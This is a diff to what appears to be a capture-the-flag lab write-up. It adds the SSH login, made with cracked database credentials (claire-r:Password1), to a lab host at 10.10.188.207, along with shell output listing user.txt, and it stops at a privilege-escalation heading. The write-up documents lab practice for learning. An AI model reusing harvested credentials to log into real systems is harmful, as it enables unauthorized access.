@@ -118,7 +118,23 @@ and database name "timetracking".
 + After have the user and password, we decrypt each passwords and use it to login SSH.
 + We find out the credential which can login SSH successfully: claire-r:Password1
 
-
+```bash
+ssh claire-r@10.10.188.207
+The authenticity of host '10.10.188.207 (10.10.188.207)' can't be established.
+ED25519 key fingerprint is SHA256:4O8itcDPWBL0nD2ELrDFEMiWY9Pn8UuEdRRP7L8pxr8.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:49: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.188.207' (ED25519) to the list of known hosts.
+claire-r@10.10.188.207's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+claire-r@ctf:~$ id
+uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)
+claire-r@ctf:~$ ls
+timeTracker-src  user.txt
+```
+--------------------------------------------------------------
+### PRIVILEGE ESCALATION ###
 
 
 
